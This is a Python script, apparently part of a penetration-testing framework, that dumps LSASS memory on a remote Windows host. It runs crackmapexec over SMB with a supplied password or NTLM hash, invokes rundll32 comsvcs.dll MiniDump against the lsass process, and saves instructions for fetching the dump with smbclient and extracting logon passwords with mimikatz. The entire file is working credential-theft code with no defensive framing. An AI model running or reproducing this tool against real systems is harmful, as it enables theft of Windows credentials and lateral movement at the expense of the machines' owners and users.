#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def dump_lsass(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    """Dump LSASS memory using ProcDump or comsvcs.dll method"""
    global logger
    setup_logger("lsass_dump", session_dir)
    logger = get_logger("lsass_dump")
    
    logger.info(f"Dumping LSASS on {target_ip}")
    
    # Build auth
    if password:
        cred_args = ["-u", username, "-p", password]
    elif ntlm_hash:
        cred_args = ["-u", username, "-H", ntlm_hash]
    else:
        logger.error("No credentials provided")
        return
    
    output_dir = os.path.join(session_dir, "lsass_dumps")
    os.makedirs(output_dir, exist_ok=True)
    
    # Method 1: comsvcs.dll (native Windows DLL)
    logger.info("Attempting LSASS dump via comsvcs.dll...")
    
    dump_path = f"C:\\Windows\\Temp\\lsass_{target_ip.replace('.', '_')}.dmp"
    
    cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-x", f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {dump_path} full"
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if "success" in result.stdout.lower() or result.returncode == 0:
            logger.info(f"LSASS dump created on target: {dump_path}")
            logger.info("Download with: smbclient.py or download via SMB share")
            
            # Create instructions
            instructions_file = os.path.join(output_dir, f"lsass_{target_ip}_instructions.txt")
            with open(instructions_file, 'w') as f:
                f.write(f"LSASS Dump Location: {dump_path}\n\n")
                f.write(f"To download:\n")
                f.write(f"1. smbclient.py {domain}/{username}@{target_ip}\n")
                f.write(f"2. get {dump_path}\n\n")
                f.write(f"To parse with mimikatz:\n")
                f.write(f"mimikatz # sekurlsa::minidump lsass.dmp\n")
                f.write(f"mimikatz # sekurlsa::logonpasswords\n")
            
            logger.info(f"Instructions saved: {instructions_file}")
        else:
            logger.warning("LSASS dump may have failed")
            
    except Exception as e:
        logger.error(f"LSASS dump failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    dump_lsass(args.session_dir, args.target_ip, args.domain,
               args.username, args.password, args.ntlm_hash)
